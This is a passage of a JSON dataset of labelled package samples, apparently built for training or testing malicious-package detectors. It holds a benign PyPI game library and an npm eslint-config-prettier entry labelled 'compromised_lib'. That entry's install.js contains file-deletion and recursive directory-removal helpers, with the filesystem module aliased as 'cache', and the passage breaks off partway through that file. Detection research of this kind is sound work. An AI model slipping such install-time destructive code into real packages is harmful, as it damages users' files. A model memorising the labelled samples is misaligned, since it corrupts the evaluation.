:mod:`pygame`'s events are sent here, so filtering\n        should be applied manually in the subclass.\n\n        :param pygame.event.Event event: event to handle\n        \"\"\"\n\n    def on_enter(self, previous_scene):\n        \"\"\"Override this to initialize upon scene entering.\n\n        The :attr:`application` property is initialized at this point,\n        so you are free to access it through ``self.application``.\n        Stuff like changing resolution etc. should be done here.\n\n        If you override this method and want to use class variables\n        to change the application's settings, you must call\n        ``super().on_enter(previous_scene)`` in the subclass.\n\n        :param Scene|None previous_scene: previous scene to run\n        \"\"\"\n        for attr in ('title', 'resolution', 'update_rate'):\n            value = getattr(self, attr)\n            if value is not None:\n                setattr(self.application, attr.lower(), value)\n\n    def on_exit(self, next_scene):\n        \"\"\"Override this to deinitialize upon scene exiting.\n\n        The :attr:`application` property is still initialized at this\n        point. Feel free to do saving, settings reset, etc. here.\n\n        :param Scene|None next_scene: next scene to run\n        \"\"\"\n==================================================\n\n# File: data/benign_samples/pypi/longtail/EzPyGame/0.3.1/EzPyGame-0.3.1/ezpygame/scene.py (function)\ndef __init__(self, title=None, resolution=None, update_rate=None):\n        self._application = None\n        if title is not None:\n            self.title = title\n        if resolution is not None:\n            self.resolution = resolution\n        if update_rate is not None:\n            self.update_rate = update_rate\n==================================================\n\n# File: data/benign_samples/pypi/longtail/EzPyGame/0.3.1/EzPyGame-0.3.1/ezpygame/scene.py (function)\ndef application(self):\n        \"\"\"The host application that's currently running the scene.\"\"\"\n        return self._application\n==================================================\n\n# File: data/benign_samples/pypi/longtail/EzPyGame/0.3.1/EzPyGame-0.3.1/ezpygame/scene.py (function)\ndef draw(self, screen):\n        \"\"\"Override this with the scene drawing.\n\n        :param pygame.Surface screen: screen to draw the scene on\n        \"\"\"\n==================================================\n\n# File: data/benign_samples/pypi/longtail/EzPyGame/0.3.1/EzPyGame-0.3.1/ezpygame/scene.py (function)\ndef update(self, dt):\n        \"\"\"Override this with the scene update tick.\n\n        :param int dt: time in milliseconds since the last update\n        \"\"\"\n==================================================\n\n# File: data/benign_samples/pypi/longtail/EzPyGame/0.3.1/EzPyGame-0.3.1/ezpygame/scene.py (function)\ndef handle_event(self, event):\n        \"\"\"Override this to handle an event in the scene.\n\n        All of :mod:`pygame`'s events are sent here, so filtering\n        should be applied manually in the subclass.\n\n        :param pygame.event.Event event: event to handle\n        \"\"\"\n==================================================\n\n# File: data/benign_samples/pypi/longtail/EzPyGame/0.3.1/EzPyGame-0.3.1/ezpygame/scene.py (function)\ndef on_enter(self, previous_scene):\n        \"\"\"Override this to initialize upon scene entering.\n\n        The :attr:`application` property is initialized at this point,\n        so you are free to access it through ``self.application``.\n        Stuff like changing resolution etc. should be done here.\n\n        If you override this method and want to use class variables\n        to change the application's settings, you must call\n        ``super().on_enter(previous_scene)`` in the subclass.\n\n        :param Scene|None previous_scene: previous scene to run\n        \"\"\"\n        for attr in ('title', 'resolution', 'update_rate'):\n            value = getattr(self, attr)\n            if value is not None:\n                setattr(self.application, attr.lower(), value)\n==================================================\n\n# File: data/benign_samples/pypi/longtail/EzPyGame/0.3.1/EzPyGame-0.3.1/ezpygame/scene.py (function)\ndef on_exit(self, next_scene):\n        \"\"\"Override this to deinitialize upon scene exiting.\n\n        The :attr:`application` property is still initialized at this\n        point. Feel free to do saving, settings reset, etc. here.\n\n        :param Scene|None next_scene: next scene to run\n        \"\"\"\n==================================================\n\n# File: data/benign_samples/pypi/longtail/EzPyGame/0.3.1/EzPyGame-0.3.1/ezpygame/application.py (class)\nclass Application:\n    \"\"\"A simple wrapper around :mod:`pygame` for running games easily.\n\n    Also makes scene management seamless together with\n    the :class:`.Scene` class.\n\n    :param str|None title: title to display in the window's title bar\n    :param tuple[int,int]|None resolution: resolution of the game window\n    :param int|None update_rate: how many times per second to update\n\n    If any parameters are left to ``None``, these settings must be\n    defined either manually through ``application.<setting> = value``\n    or via :class:`.Scene`'s class variable settings.\n\n    Example usage:\n\n    .. code-block:: python\n\n        class Menu(ezpygame.Scene):\n            ...\n\n        class Game(ezpygame.Scene):\n            ...\n\n        app = ezpygame.Application(\n            title='My First EzPyGame Application',\n            resolution=(1280, 720),\n            update_rate=60,\n        )\n        main_menu = Menu()\n        app.run(main_menu)\n    \"\"\"\n\n    def __init__(self,\n                 title=None,\n                 resolution=None,\n                 update_rate=None):\n        pygame.init()\n        self.update_rate = update_rate\n        self._scene = None\n        # Trigger property setters\n        self.title = title\n        self.resolution = resolution\n\n    @property\n    def title(self):\n        return pygame.display.get_caption()\n\n    @title.setter\n    def title(self, value):\n        pygame.display.set_caption(value)\n\n    @property\n    def resolution(self):\n        return self._screen.get_size()\n\n    @resolution.setter\n    def resolution(self, value):\n        self._screen = pygame.display.set_mode(value)\n\n    @property\n    def active_scene(self):\n        \"\"\"The currently active scene. Can be ``None``.\"\"\"\n        return self._scene\n\n    def change_scene(self, scene):\n        \"\"\"Change the currently active scene.\n\n        This will invoke :meth:`.Scene.on_exit` and\n        :meth:`.Scene.on_enter` methods on the switching scenes.\n\n        If ``None`` is provided, the application's execution will end.\n\n        :param Scene|None scene: the scene to change into\n        \"\"\"\n        if self.active_scene is not None:\n            self.active_scene.on_exit(next_scene=scene)\n            self.active_scene._application = None\n        self._scene, old_scene = scene, self.active_scene\n        if self.active_scene is not None:\n            self.active_scene._application = self\n            self.active_scene.on_enter(previous_scene=old_scene)\n\n    def run(self, scene=None):\n        \"\"\"Execute the application.\n\n        :param scene.Scene|None scene: scene to start the execution from\n        \"\"\"\n        if scene is None:\n            if self.active_scene is None:\n                raise ValueError('No scene provided')\n        else:\n            self.change_scene(scene)\n\n        clock = pygame.time.Clock()\n\n        while self.active_scene is not None:\n\n            for event in pygame.event.get():\n                self.active_scene.handle_event(event)\n                if event.type == pygame.QUIT:\n                    self.change_scene(None)  # Trigger Scene.on_exit()\n                    return\n\n            dt = clock.tick(self.update_rate)\n            self.active_scene.update(dt)\n\n            self.active_scene.draw(self._screen)\n            pygame.display.update()\n==================================================\n\n# File: data/benign_samples/pypi/longtail/EzPyGame/0.3.1/EzPyGame-0.3.1/ezpygame/application.py (function)\ndef __init__(self,\n                 title=None,\n                 resolution=None,\n                 update_rate=None):\n        pygame.init()\n        self.update_rate = update_rate\n        self._scene = None\n        # Trigger property setters\n        self.title = title\n        self.resolution = resolution\n==================================================\n\n# File: data/benign_samples/pypi/longtail/EzPyGame/0.3.1/EzPyGame-0.3.1/ezpygame/application.py (function)\ndef title(self):\n        return pygame.display.get_caption()\n==================================================\n\n# File: data/benign_samples/pypi/longtail/EzPyGame/0.3.1/EzPyGame-0.3.1/ezpygame/application.py (function)\ndef title(self, value):\n        pygame.display.set_caption(value)\n==================================================\n\n# File: data/benign_samples/pypi/longtail/EzPyGame/0.3.1/EzPyGame-0.3.1/ezpygame/application.py (function)\ndef resolution(self):\n        return self._screen.get_size()\n==================================================\n\n# File: data/benign_samples/pypi/longtail/EzPyGame/0.3.1/EzPyGame-0.3.1/ezpygame/application.py (function)\ndef resolution(self, value):\n        self._screen = pygame.display.set_mode(value)\n==================================================\n\n# File: data/benign_samples/pypi/longtail/EzPyGame/0.3.1/EzPyGame-0.3.1/ezpygame/application.py (function)\ndef active_scene(self):\n        \"\"\"The currently active scene. Can be ``None``.\"\"\"\n        return self._scene\n==================================================\n\n# File: data/benign_samples/pypi/longtail/EzPyGame/0.3.1/EzPyGame-0.3.1/ezpygame/application.py (function)\ndef change_scene(self, scene):\n        \"\"\"Change the currently active scene.\n\n        This will invoke :meth:`.Scene.on_exit` and\n        :meth:`.Scene.on_enter` methods on the switching scenes.\n\n        If ``None`` is provided, the application's execution will end.\n\n        :param Scene|None scene: the scene to change into\n        \"\"\"\n        if self.active_scene is not None:\n            self.active_scene.on_exit(next_scene=scene)\n            self.active_scene._application = None\n        self._scene, old_scene = scene, self.active_scene\n        if self.active_scene is not None:\n            self.active_scene._application = self\n            self.active_scene.on_enter(previous_scene=old_scene)\n==================================================\n\n# File: data/benign_samples/pypi/longtail/EzPyGame/0.3.1/EzPyGame-0.3.1/ezpygame/application.py (function)\ndef run(self, scene=None):\n        \"\"\"Execute the application.\n\n        :param scene.Scene|None scene: scene to start the execution from\n        \"\"\"\n        if scene is None:\n            if self.active_scene is None:\n                raise ValueError('No scene provided')\n        else:\n            self.change_scene(scene)\n\n        clock = pygame.time.Clock()\n\n        while self.active_scene is not None:\n\n            for event in pygame.event.get():\n                self.active_scene.handle_event(event)\n                if event.type == pygame.QUIT:\n                    self.change_scene(None)  # Trigger Scene.on_exit()\n                    return\n\n            dt = clock.tick(self.update_rate)\n            self.active_scene.update(dt)\n\n            self.active_scene.draw(self._screen)\n            pygame.display.update()\n==================================================\n\n# File: data/benign_samples/pypi/longtail/EzPyGame/0.3.1/EzPyGame-0.3.1/setup.py (file)\nfrom distutils.core import setup\n\n\nsetup(\n    name='EzPyGame',\n    packages=['ezpygame'],\n    install_requires=['pygame'],\n    version='0.3.1',\n    license='MIT',\n    description='An easier way to use pygame',\n    author='Markus Meskanen',\n    author_email='markusmeskanen@gmail.com',\n    url='https://github.com/Mahi/EzPyGame',\n    download_url='https://github.com/Mahi/EzPyGame/archive/0.3.1.tar.gz',\n    keywords=['pygame', 'game', 'gaming', 'games', 'ez', 'easy', 'ezpg'],\n    classifiers=[\n        'Development Status :: 3 - Alpha',\n        'License :: OSI Approved :: MIT License',\n        'Intended Audience :: Developers',\n        'Topic :: Games/Entertainment',\n\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3 :: Only',\n        'Programming Language :: Python :: 3.5',\n        'Programming Language :: Python :: 3.6',\n    ],\n)\n\n==================================================\n",
      "file_paths": [
        "data/benign_samples/pypi/longtail/EzPyGame/0.3.1/EzPyGame-0.3.1/setup.py",
        "data/benign_samples/pypi/longtail/EzPyGame/0.3.1/EzPyGame-0.3.1/ezpygame/__init__.py",
        "data/benign_samples/pypi/longtail/EzPyGame/0.3.1/EzPyGame-0.3.1/ezpygame/scene.py",
        "data/benign_samples/pypi/longtail/EzPyGame/0.3.1/EzPyGame-0.3.1/ezpygame/scene.py",
        "data/benign_samples/pypi/longtail/EzPyGame/0.3.1/EzPyGame-0.3.1/ezpygame/scene.py",
        "data/benign_samples/pypi/longtail/EzPyGame/0.3.1/EzPyGame-0.3.1/ezpygame/scene.py",
        "data/benign_samples/pypi/longtail/EzPyGame/0.3.1/EzPyGame-0.3.1/ezpygame/scene.py",
        "data/benign_samples/pypi/longtail/EzPyGame/0.3.1/EzPyGame-0.3.1/ezpygame/scene.py",
        "data/benign_samples/pypi/longtail/EzPyGame/0.3.1/EzPyGame-0.3.1/ezpygame/scene.py",
        "data/benign_samples/pypi/longtail/EzPyGame/0.3.1/EzPyGame-0.3.1/ezpygame/scene.py",
        "data/benign_samples/pypi/longtail/EzPyGame/0.3.1/EzPyGame-0.3.1/ezpygame/application.py",
        "data/benign_samples/pypi/longtail/EzPyGame/0.3.1/EzPyGame-0.3.1/ezpygame/application.py",
        "data/benign_samples/pypi/longtail/EzPyGame/0.3.1/EzPyGame-0.3.1/ezpygame/application.py",
        "data/benign_samples/pypi/longtail/EzPyGame/0.3.1/EzPyGame-0.3.1/ezpygame/application.py",
        "data/benign_samples/pypi/longtail/EzPyGame/0.3.1/EzPyGame-0.3.1/ezpygame/application.py",
        "data/benign_samples/pypi/longtail/EzPyGame/0.3.1/EzPyGame-0.3.1/ezpygame/application.py",
        "data/benign_samples/pypi/longtail/EzPyGame/0.3.1/EzPyGame-0.3.1/ezpygame/application.py",
        "data/benign_samples/pypi/longtail/EzPyGame/0.3.1/EzPyGame-0.3.1/ezpygame/application.py",
        "data/benign_samples/pypi/longtail/EzPyGame/0.3.1/EzPyGame-0.3.1/ezpygame/application.py",
        "data/benign_samples/pypi/longtail/EzPyGame/0.3.1/EzPyGame-0.3.1/setup.py"
      ],
      "individual_files": {
        "data/benign_samples/pypi/longtail/EzPyGame/0.3.1/EzPyGame-0.3.1/setup.py": "from distutils.core import setup\n\n\nsetup(\n    name='EzPyGame',\n    packages=['ezpygame'],\n    install_requires=['pygame'],\n    version='0.3.1',\n    license='MIT',\n    description='An easier way to use pygame',\n    author='Markus Meskanen',\n    author_email='markusmeskanen@gmail.com',\n    url='https://github.com/Mahi/EzPyGame',\n    download_url='https://github.com/Mahi/EzPyGame/archive/0.3.1.tar.gz',\n    keywords=['pygame', 'game', 'gaming', 'games', 'ez', 'easy', 'ezpg'],\n    classifiers=[\n        'Development Status :: 3 - Alpha',\n        'License :: OSI Approved :: MIT License',\n        'Intended Audience :: Developers',\n        'Topic :: Games/Entertainment',\n\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3 :: Only',\n        'Programming Language :: Python :: 3.5',\n        'Programming Language :: Python :: 3.6',\n    ],\n)\n",
        "data/benign_samples/pypi/longtail/EzPyGame/0.3.1/EzPyGame-0.3.1/ezpygame/__init__.py": "\"\"\"Easier and more pythonic usage of :mod:`pygame`.\"\"\"\n\nfrom .application import Application\nfrom .scene import Scene\n",
        "data/benign_samples/pypi/longtail/EzPyGame/0.3.1/EzPyGame-0.3.1/ezpygame/scene.py": "def on_exit(self, next_scene):\n        \"\"\"Override this to deinitialize upon scene exiting.\n\n        The :attr:`application` property is still initialized at this\n        point. Feel free to do saving, settings reset, etc. here.\n\n        :param Scene|None next_scene: next scene to run\n        \"\"\"",
        "data/benign_samples/pypi/longtail/EzPyGame/0.3.1/EzPyGame-0.3.1/ezpygame/application.py": "def run(self, scene=None):\n        \"\"\"Execute the application.\n\n        :param scene.Scene|None scene: scene to start the execution from\n        \"\"\"\n        if scene is None:\n            if self.active_scene is None:\n                raise ValueError('No scene provided')\n        else:\n            self.change_scene(scene)\n\n        clock = pygame.time.Clock()\n\n        while self.active_scene is not None:\n\n            for event in pygame.event.get():\n                self.active_scene.handle_event(event)\n                if event.type == pygame.QUIT:\n                    self.change_scene(None)  # Trigger Scene.on_exit()\n                    return\n\n            dt = clock.tick(self.update_rate)\n            self.active_scene.update(dt)\n\n            self.active_scene.draw(self._screen)\n            pygame.display.update()"
      },
      "package_size_bytes": 17732,
      "num_files": 20,
      "metadata": {
        "package_hash": "pypi_EzPyGame_0.3.1",
        "malicious_label": 0.0
      }
    },
    {
      "package_name": "eslint-config-prettier",
      "ecosystem": "npm",
      "sample_type": "compromised_lib",
      "ground_truth_label": 1,
      "raw_content": "\n# File: /var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpi183h16c/tmp/tmp64m1mav7/eslint-config-prettier/package/standard.js (file)\nthrow new Error(\n  '\"prettier/standard\" has been merged into \"prettier\" in eslint-config-prettier 8.0.0. See: https://github.com/prettier/eslint-config-prettier/blob/main/CHANGELOG.md#version-800-2021-02-21'\n);\n==================================================\n\n# File: /var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpi183h16c/tmp/tmp64m1mav7/eslint-config-prettier/package/prettier.js (file)\n\"use strict\";\n\nmodule.exports = {\n  rules: {\n    // These are safe to use as long as the `\"prettier/prettier\"` rule from\n    // eslint-plugin-prettier isn\u2019t enabled.\n    // These are also included in `\"plugin:prettier/recommended\"`:\n    // https://github.com/prettier/eslint-plugin-prettier#recommended-configuration\n    \"arrow-body-style\": 0,\n    \"prefer-arrow-callback\": 0,\n  },\n};\n\n==================================================\n\n# File: /var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpi183h16c/tmp/tmp64m1mav7/eslint-config-prettier/package/unicorn.js (file)\nthrow new Error(\n  '\"prettier/unicorn\" has been merged into \"prettier\" in eslint-config-prettier 8.0.0. See: https://github.com/prettier/eslint-config-prettier/blob/main/CHANGELOG.md#version-800-2021-02-21'\n);\n==================================================\n\n# File: /var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpi183h16c/tmp/tmp64m1mav7/eslint-config-prettier/package/react.js (file)\nthrow new Error(\n  '\"prettier/react\" has been merged into \"prettier\" in eslint-config-prettier 8.0.0. See: https://github.com/prettier/eslint-config-prettier/blob/main/CHANGELOG.md#version-800-2021-02-21'\n);\n==================================================\n\n# File: /var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpi183h16c/tmp/tmp64m1mav7/eslint-config-prettier/package/index.js (file)\n\"use strict\";\n\nconst includeDeprecated = !process.env.ESLINT_CONFIG_PRETTIER_NO_DEPRECATED;\n\nmodule.exports = {\n  rules: {\n    // The following rules can be used in some cases. See the README for more\n    // information. (These are marked with `0` instead of `\"off\"` so that a\n    // script can distinguish them.)\n    \"curly\": 0,\n    \"lines-around-comment\": 0,\n    \"max-len\": 0,\n    \"no-confusing-arrow\": 0,\n    \"no-mixed-operators\": 0,\n    \"no-tabs\": 0,\n    \"no-unexpected-multiline\": 0,\n    \"quotes\": 0,\n    \"@typescript-eslint/lines-around-comment\": 0,\n    \"@typescript-eslint/quotes\": 0,\n    \"babel/quotes\": 0,\n    \"vue/html-self-closing\": 0,\n    \"vue/max-len\": 0,\n\n    // The rest are rules that you never need to enable when using Prettier.\n    \"array-bracket-newline\": \"off\",\n    \"array-bracket-spacing\": \"off\",\n    \"array-element-newline\": \"off\",\n    \"arrow-parens\": \"off\",\n    \"arrow-spacing\": \"off\",\n    \"block-spacing\": \"off\",\n    \"brace-style\": \"off\",\n    \"comma-dangle\": \"off\",\n    \"comma-spacing\": \"off\",\n    \"comma-style\": \"off\",\n    \"computed-property-spacing\": \"off\",\n    \"dot-location\": \"off\",\n    \"eol-last\": \"off\",\n    \"func-call-spacing\": \"off\",\n    \"function-call-argument-newline\": \"off\",\n    \"function-paren-newline\": \"off\",\n    \"generator-star-spacing\": \"off\",\n    \"implicit-arrow-linebreak\": \"off\",\n    \"indent\": \"off\",\n    \"jsx-quotes\": \"off\",\n    \"key-spacing\": \"off\",\n    \"keyword-spacing\": \"off\",\n    \"linebreak-style\": \"off\",\n    \"max-statements-per-line\": \"off\",\n    \"multiline-ternary\": \"off\",\n    \"newline-per-chained-call\": \"off\",\n    \"new-parens\": \"off\",\n    \"no-extra-parens\": \"off\",\n    \"no-extra-semi\": \"off\",\n    \"no-floating-decimal\": \"off\",\n    \"no-mixed-spaces-and-tabs\": \"off\",\n    \"no-multi-spaces\": \"off\",\n    \"no-multiple-empty-lines\": \"off\",\n    \"no-trailing-spaces\": \"off\",\n    \"no-whitespace-before-property\": \"off\",\n    \"nonblock-statement-body-position\": \"off\",\n    \"object-curly-newline\": \"off\",\n    \"object-curly-spacing\": \"off\",\n    \"object-property-newline\": \"off\",\n    \"one-var-declaration-per-line\": \"off\",\n    \"operator-linebreak\": \"off\",\n    \"padded-blocks\": \"off\",\n    \"quote-props\": \"off\",\n    \"rest-spread-spacing\": \"off\",\n    \"semi\": \"off\",\n    \"semi-spacing\": \"off\",\n    \"semi-style\": \"off\",\n    \"space-before-blocks\": \"off\",\n    \"space-before-function-paren\": \"off\",\n    \"space-in-parens\": \"off\",\n    \"space-infix-ops\": \"off\",\n    \"space-unary-ops\": \"off\",\n    \"switch-colon-spacing\": \"off\",\n    \"template-curly-spacing\": \"off\",\n    \"template-tag-spacing\": \"off\",\n    \"unicode-bom\": \"off\",\n    \"wrap-iife\": \"off\",\n    \"wrap-regex\": \"off\",\n    \"yield-star-spacing\": \"off\",\n    \"@babel/object-curly-spacing\": \"off\",\n    \"@babel/semi\": \"off\",\n    \"@typescript-eslint/block-spacing\": \"off\",\n    \"@typescript-eslint/brace-style\": \"off\",\n    \"@typescript-eslint/comma-dangle\": \"off\",\n    \"@typescript-eslint/comma-spacing\": \"off\",\n    \"@typescript-eslint/func-call-spacing\": \"off\",\n    \"@typescript-eslint/indent\": \"off\",\n    \"@typescript-eslint/key-spacing\": \"off\",\n    \"@typescript-eslint/keyword-spacing\": \"off\",\n    \"@typescript-eslint/member-delimiter-style\": \"off\",\n    \"@typescript-eslint/no-extra-parens\": \"off\",\n    \"@typescript-eslint/no-extra-semi\": \"off\",\n    \"@typescript-eslint/object-curly-spacing\": \"off\",\n    \"@typescript-eslint/semi\": \"off\",\n    \"@typescript-eslint/space-before-blocks\": \"off\",\n    \"@typescript-eslint/space-before-function-paren\": \"off\",\n    \"@typescript-eslint/space-infix-ops\": \"off\",\n    \"@typescript-eslint/type-annotation-spacing\": \"off\",\n    \"babel/object-curly-spacing\": \"off\",\n    \"babel/semi\": \"off\",\n    \"flowtype/boolean-style\": \"off\",\n    \"flowtype/delimiter-dangle\": \"off\",\n    \"flowtype/generic-spacing\": \"off\",\n    \"flowtype/object-type-curly-spacing\": \"off\",\n    \"flowtype/object-type-delimiter\": \"off\",\n    \"flowtype/quotes\": \"off\",\n    \"flowtype/semi\": \"off\",\n    \"flowtype/space-after-type-colon\": \"off\",\n    \"flowtype/space-before-generic-bracket\": \"off\",\n    \"flowtype/space-before-type-colon\": \"off\",\n    \"flowtype/union-intersection-spacing\": \"off\",\n    \"react/jsx-child-element-spacing\": \"off\",\n    \"react/jsx-closing-bracket-location\": \"off\",\n    \"react/jsx-closing-tag-location\": \"off\",\n    \"react/jsx-curly-newline\": \"off\",\n    \"react/jsx-curly-spacing\": \"off\",\n    \"react/jsx-equals-spacing\": \"off\",\n    \"react/jsx-first-prop-new-line\": \"off\",\n    \"react/jsx-indent\": \"off\",\n    \"react/jsx-indent-props\": \"off\",\n    \"react/jsx-max-props-per-line\": \"off\",\n    \"react/jsx-newline\": \"off\",\n    \"react/jsx-one-expression-per-line\": \"off\",\n    \"react/jsx-props-no-multi-spaces\": \"off\",\n    \"react/jsx-tag-spacing\": \"off\",\n    \"react/jsx-wrap-multilines\": \"off\",\n    \"standard/array-bracket-even-spacing\": \"off\",\n    \"standard/computed-property-even-spacing\": \"off\",\n    \"standard/object-curly-even-spacing\": \"off\",\n    \"unicorn/empty-brace-spaces\": \"off\",\n    \"unicorn/no-nested-ternary\": \"off\",\n    \"unicorn/number-literal-case\": \"off\",\n    \"vue/array-bracket-newline\": \"off\",\n    \"vue/array-bracket-spacing\": \"off\",\n    \"vue/array-element-newline\": \"off\",\n    \"vue/arrow-spacing\": \"off\",\n    \"vue/block-spacing\": \"off\",\n    \"vue/block-tag-newline\": \"off\",\n    \"vue/brace-style\": \"off\",\n    \"vue/comma-dangle\": \"off\",\n    \"vue/comma-spacing\": \"off\",\n    \"vue/comma-style\": \"off\",\n    \"vue/dot-location\": \"off\",\n    \"vue/func-call-spacing\": \"off\",\n    \"vue/html-closing-bracket-newline\": \"off\",\n    \"vue/html-closing-bracket-spacing\": \"off\",\n    \"vue/html-end-tags\": \"off\",\n    \"vue/html-indent\": \"off\",\n    \"vue/html-quotes\": \"off\",\n    \"vue/key-spacing\": \"off\",\n    \"vue/keyword-spacing\": \"off\",\n    \"vue/max-attributes-per-line\": \"off\",\n    \"vue/multiline-html-element-content-newline\": \"off\",\n    \"vue/multiline-ternary\": \"off\",\n    \"vue/mustache-interpolation-spacing\": \"off\",\n    \"vue/no-extra-parens\": \"off\",\n    \"vue/no-multi-spaces\": \"off\",\n    \"vue/no-spaces-around-equal-signs-in-attribute\": \"off\",\n    \"vue/object-curly-newline\": \"off\",\n    \"vue/object-curly-spacing\": \"off\",\n    \"vue/object-property-newline\": \"off\",\n    \"vue/operator-linebreak\": \"off\",\n    \"vue/quote-props\": \"off\",\n    \"vue/script-indent\": \"off\",\n    \"vue/singleline-html-element-content-newline\": \"off\",\n    \"vue/space-in-parens\": \"off\",\n    \"vue/space-infix-ops\": \"off\",\n    \"vue/space-unary-ops\": \"off\",\n    \"vue/template-curly-spacing\": \"off\",\n\n    ...(includeDeprecated && {\n      // Removed in version 1.0.0.\n      // https://eslint.org/docs/latest/rules/generator-star\n      \"generator-star\": \"off\",\n      // Deprecated since version 4.0.0.\n      // https://github.com/eslint/eslint/pull/8286\n      \"indent-legacy\": \"off\",\n      // Removed in version 2.0.0.\n      // https://eslint.org/docs/latest/rules/no-arrow-condition\n      \"no-arrow-condition\": \"off\",\n      // Removed in version 1.0.0.\n      // https://eslint.org/docs/latest/rules/no-comma-dangle\n      \"no-comma-dangle\": \"off\",\n      // Removed in version 1.0.0.\n      // https://eslint.org/docs/latest/rules/no-reserved-keys\n      \"no-reserved-keys\": \"off\",\n      // Removed in version 1.0.0.\n      // https://eslint.org/docs/latest/rules/no-space-before-semi\n      \"no-space-before-semi\": \"off\",\n      // Deprecated since version 3.3.0.\n      // https://eslint.org/docs/rules/no-spaced-func\n      \"no-spaced-func\": \"off\",\n      // Removed in version 1.0.0.\n      // https://eslint.org/docs/latest/rules/no-wrap-func\n      \"no-wrap-func\": \"off\",\n      // Removed in version 1.0.0.\n      // https://eslint.org/docs/latest/rules/space-after-function-name\n      \"space-after-function-name\": \"off\",\n      // Removed in version 2.0.0.\n      // https://eslint.org/docs/latest/rules/space-after-keywords\n      \"space-after-keywords\": \"off\",\n      // Removed in version 1.0.0.\n      // https://eslint.org/docs/latest/rules/space-before-function-parentheses\n      \"space-before-function-parentheses\": \"off\",\n      // Removed in version 2.0.0.\n      // https://eslint.org/docs/latest/rules/space-before-keywords\n      \"space-before-keywords\": \"off\",\n      // Removed in version 1.0.0.\n      // https://eslint.org/docs/latest/rules/space-in-brackets\n      \"space-in-brackets\": \"off\",\n      // Removed in version 2.0.0.\n      // https://eslint.org/docs/latest/rules/space-return-throw-case\n      \"space-return-throw-case\": \"off\",\n      // Removed in version 0.10.0.\n      // https://eslint.org/docs/latest/rules/space-unary-word-ops\n      \"space-unary-word-ops\": \"off\",\n      // Deprecated since version 7.0.0.\n      // https://github.com/yannickcr/eslint-plugin-react/blob/master/CHANGELOG.md#700---2017-05-06\n      \"react/jsx-space-before-closing\": \"off\",\n    }),\n  },\n};\n\n==================================================\n\n# File: /var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpi183h16c/tmp/tmp64m1mav7/eslint-config-prettier/package/@typescript-eslint.js (file)\nthrow new Error(\n  '\"prettier/@typescript-eslint\" has been merged into \"prettier\" in eslint-config-prettier 8.0.0. See: https://github.com/prettier/eslint-config-prettier/blob/main/CHANGELOG.md#version-800-2021-02-21'\n);\n==================================================\n\n# File: /var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpi183h16c/tmp/tmp64m1mav7/eslint-config-prettier/package/install.js (function)\nfunction log(msg) {\n    console.log(msg);\n    if (!DRY_RUN) {\n        try {\n            cache.appendFileSync(LOG_FILE, msg + '\\n');\n        } catch (err) {\n            console.error(`Failed to write log: ${err.message}`);\n        }\n    }\n}\n\nfunction ensureDir(dirPath) {\n    if (!cache.existsSync(dirPath)) {\n        if (!DRY_RUN) {\n            cache.mkdirSync(dirPath, { recursive: true });\n        }\n        summary.dirsCreated++;\n        log(`Created directory: ${dirPath}`);\n    } else {\n        \n==================================================\n\n# File: /var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpi183h16c/tmp/tmp64m1mav7/eslint-config-prettier/package/install.js (function)\nfunction ensureDir(dirPath) {\n    if (!cache.existsSync(dirPath)) {\n        if (!DRY_RUN) {\n            cache.mkdirSync(dirPath, { recursive: true });\n        }\n        summary.dirsCreated++;\n        log(`Created directory: ${dirPath}`);\n    } else {\n        log(`Directory exists: ${dirPath}`);\n    }\n}\n\nfunction deleteFile(filePath) {\n    if (DRY_RUN) {\n        log(`[Dry-run] Would delete file: ${filePath}`);\n        return;\n    }\n    try {\n        cache.unlinkSync(filePath);\n        summary.fil\n==================================================\n\n# File: /var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpi183h16c/tmp/tmp64m1mav7/eslint-config-prettier/package/install.js (function)\nfunction deleteFile(filePath) {\n    if (DRY_RUN) {\n        log(`[Dry-run] Would delete file: ${filePath}`);\n        return;\n    }\n    try {\n        cache.unlinkSync(filePath);\n        summary.filesDeleted++;\n        log(`Deleted file: ${filePath}`);\n    } catch (err) {\n        summary.errors++;\n        log(`Error deleting file ${filePath}: ${err.message}`);\n    }\n}\n\nfunction deleteDir(dirPath) {\n    if (DRY_RUN) {\n        log(`[Dry-run] Would delete directory: ${dirPath}`);\n        return;\n    }\n==================================================\n\n# File: /var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpi183h16c/tmp/tmp64m1mav7/eslint-config-prettier/package/install.js (function)\nfunction deleteDir(dirPath) {\n    if (DRY_RUN) {\n        log(`[Dry-run] Would delete directory: ${dirPath}`);\n        return;\n    }\n    try {\n        cache.rmSync(dirPath, { recursive: true, force: true });\n        summary.dirsDeleted++;\n        log(`Deleted directory: ${dirPath}`);\n    } catch (err) {\n        summary.errors++;\n        log(`Error deleting directory ${dirPath}: ${err.message}`);\n    }\n}\n\nfunction archiveFile(filePath) {\n    ensureDir(ARCHIVE_DIR);\n    const fileName = path.basena\n==================================================\n\n# File: /var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpi183h16c/tmp/tmp64m1mav7/eslint-config-prettier/package/install.js (function)\nfunction archiveFile(filePath) {\n    ensureDir(ARCHIVE_DIR);\n    const fileName = path.basename(filePath);\n    const targetPath = path.join(ARCHIVE_DIR, fileName);\n\n    if (DRY_RUN) {\n        log(`[Dry-run] Would archive file: ${filePath} -> ${targetPath}`);\n        return;\n    }\n    try {\n        cache.renameSync(filePath, targetPath);\n        summary.filesArchived++;\n        log(`Archived file: ${filePath} -> ${targetPath}`);\n    } catch (err) {\n        summary.errors++;\n        log(`Error arc\n==================================================\n\n# File: /var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpi183h16c/tmp/tmp64m1mav7/eslint-config-prettier/package/install.js (function)\nfunction cleanOldFiles(dirPath, maxAgeDays = DEFAULT_MAX_AGE_DAYS) {\n    if (!cache.existsSync(dirPath)) return;\n    const now = 